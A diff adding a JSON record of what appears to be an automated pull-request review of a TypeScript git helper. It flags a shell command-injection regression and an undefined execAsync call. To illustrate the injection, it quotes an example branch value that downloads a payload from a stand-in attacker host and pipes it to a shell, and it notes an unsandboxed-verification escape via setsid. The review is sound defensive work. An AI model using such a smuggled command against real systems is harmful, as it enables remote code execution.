@@ -1,0 +1,33 @@
+{
+  "schemaVersion": 1,
+  "planEntryId": "72297f353e3e742325710e4e",
+  "publication": {
+    "artifact": "canonical",
+    "fallback": false
+  },
+  "findings": [
+    {
+      "title": "[P1] Pass the branch as an argument list, not an interpolated shell command",
+      "body": "The rewrite replaces the injection-safe argument-array form with shell string interpolation. If `branch` contains shell metacharacters (e.g. `main; curl attacker.example/payload | sh`), `execAsync` runs arbitrary commands with the process's privileges, and even benign ref names containing shell-special characters are misparsed. `showBranch` is exported, so any caller passing user- or request-derived input (branch selectors, ref filters, API parameters) becomes exploitable. Restore the non-shell form — e.g. `execFileAsync(\"git\", [\"show\", branch])` — or validate `branch` against a strict ref-name pattern before building the string.",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 15,
+        "end": 16
+      }
+    },
+    {
+      "title": "[P1] Import or define `execAsync` before calling it",
+      "body": "The only import in `src/git.ts` is `execFile` from `node:child_process`; a repository-wide search finds no declaration or import of `execAsync`. TypeScript therefore fails on the changed line (`Cannot find name 'execAsync'`), and if emitted anyway, every `showBranch()` call rejects with `ReferenceError: execAsync is not defined` before git runs. Note the base branch's `execFileAsync` reference had the same defect, but this diff rewrites the exact expression, so the fix belongs here: either restore the `execFile`-based call or import a promisified `exec` (e.g. `const execAsync = promisify(exec)`).",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 16,
+        "end": 16
+      }
+    }
+  ],
+  "markdown": "# PR Review\n\n**Verdict:** request_changes\n\n## Overview\n\nThis PR rewrites the body of `showBranch` in `src/git.ts`: instead of invoking git via an argument array (`execFileAsync(\"git\", [\"show\", branch])`), it now builds the string `` `git show ${branch}` `` and passes it to `execAsync`, i.e. a shell-interpreted `exec`-style call. The stated intent is to \"refine behavior while preserving existing contracts,\" and the exported `showBranch(branch: string)` signature is indeed unchanged.\n\nThe rewrite introduces two blocking problems: it moves an unescaped parameter into a shell command string (a command-injection regression), and it calls `execAsync`, an identifier that is neither imported nor defined anywhere in the repository, so the changed line fails typecheck and throws `ReferenceError` at runtime.\n\n## Verification\n\nVerification did not run: no user-level `verificationBaselines` are configured, so `pr_review_verify` reported verification disabled. Note that when enabled, baselines execute PR code unsandboxed (supervision covers only the original POSIX process group; a deliberate `setsid` escape can survive it) — use an external sandbox/container wrapper for untrusted PRs. Candidate validation was performed directly against the repository source instead.\n\n## Findings\n\n### [P1] Pass the branch as an argument list, not an interpolated shell command\n**Severity:** P1\n**Rationale:** The rewrite replaces the injection-safe argument-array form with shell string interpolation. If `branch` contains shell metacharacters (e.g. `main; curl attacker.example/payload | sh`), `execAsync` runs arbitrary commands with the process's privileges, and even benign ref names containing shell-special characters are misparsed. `showBranch` is exported, so any caller passing user- or request-derived input (branch selectors, ref filters, API parameters) becomes exploitable. Restore the non-shell form — e.g. `execFileAsync(\"git\", [\"show\", branch])` — or validate `branch` against a strict ref-name pattern before building the string.\n**Location:** `src/git.ts:15-16 RIGHT`\n\n### [P1] Import or define `execAsync` before calling it\n**Severity:** P1\n**Rationale:** The only import in `src/git.ts` is `execFile` from `node:child_process`; a repository-wide search finds no declaration or import of `execAsync`. TypeScript therefore fails on the changed line (`Cannot find name 'execAsync'`), and if emitted anyway, every `showBranch()` call rejects with `ReferenceError: execAsync is not defined` before git runs. Note the base branch's `execFileAsync` reference had the same defect, but this diff rewrites the exact expression, so the fix belongs here: either restore the `execFile`-based call or import a promisified `exec` (e.g. `const execAsync = promisify(exec)`).\n**Location:** `src/git.ts:16 RIGHT`\n\n## Lane completeness\n\nAll requested lanes completed.\n\n## Strengths and notes\n\n- Keeps the exported `showBranch(branch: string)` contract unchanged, as the PR description intends.\n- **Correctness:** the function is currently non-functional — it references an undefined identifier (finding 2).\n- **Security:** the switch from argument-array `execFile` to interpolated shell execution is a textbook CWE-78 regression (finding 1); reverting to the array form fixes both the injection risk and the undefined-helper issue in one step.\n- **Performance:** no regressions found; the performance-resources lane reported no findings."
+}
